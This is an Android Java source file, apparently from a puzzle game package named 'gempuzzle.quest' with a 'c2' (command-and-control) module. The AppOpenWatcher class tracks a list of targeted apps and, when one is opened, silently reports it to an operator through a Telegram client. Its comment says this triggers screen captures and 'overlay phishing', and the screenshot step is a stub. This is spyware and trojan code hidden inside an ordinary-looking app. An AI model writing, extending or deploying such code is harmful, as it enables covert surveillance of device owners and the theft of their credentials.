package com.gempuzzle.quest.c2;

import android.content.Context;
import android.content.SharedPreferences;

import java.util.HashSet;
import java.util.Set;

/**
 * App-open watcher — triggers /on_app_open captures and
 * overlay phishing when a watched package is foregrounded.
 */
public final class AppOpenWatcher {

    private static final Set<String> watched = new HashSet<>();
    private static String lastPkg = "";

    public static synchronized void watch(String pkg) {
        watched.add(pkg);
    }

    public static synchronized void unwatch(String pkg) {
        watched.remove(pkg);
    }

    public static synchronized void onAppOpen(Context ctx, String pkg) {
        if (pkg == null || pkg.equals(lastPkg)) return;
        lastPkg = pkg;
        if (watched.contains(pkg)) {
            // Trigger silent screenshot + alert admin
            TelegramClient.sendMessage("📲 *WATCHED APP OPENED:* `" + pkg + "`");
            // Screenshot would be captured here via MediaProjection (stub)
        }
    }

    private AppOpenWatcher() {}
}
